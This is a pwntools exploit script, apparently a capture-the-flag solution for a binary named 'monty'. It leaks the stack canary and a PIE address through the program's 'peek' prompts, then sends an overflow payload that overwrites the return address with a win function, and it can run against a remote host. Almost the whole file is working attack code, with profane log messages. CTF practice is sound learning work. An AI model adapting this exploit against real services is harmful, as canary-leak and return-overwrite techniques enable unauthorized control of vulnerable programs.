from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./monty"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *game+763
    b *game+804
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    #offset = 
    # canary offset : 55 
    # breaking pie : 57
    # piebase : leak - 5758
    log.info("binary loaded")
    pp.recvuntil(b"?")
    log.info(b"extracting the fucking canary")
    pp.sendline(b"55")
    canary = int(pp.recvuntil(b"peek?").split(b"\n")[0].replace(b" Peek 1: ", b""))
    pp.sendline(b"57")
    elf.address = int(pp.recvuntil(b"lady!").split(b"\n")[0].replace(b" Peek 2: ", b"")) - 5758
    log.info(f"fucking piebase {hex(elf.address)}, canary {hex(canary)}")
    pp.sendline(b"3")
    pp.recvuntil(b"Name: ")
    payload = flat(
        cyclic(3 * 8), 
        canary,
        0,
        elf.sym.win
            )
    pp.sendline(payload)
    pp.interactive()

if (args.REMOTE):
    libc = ELF("/usr/lib/libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
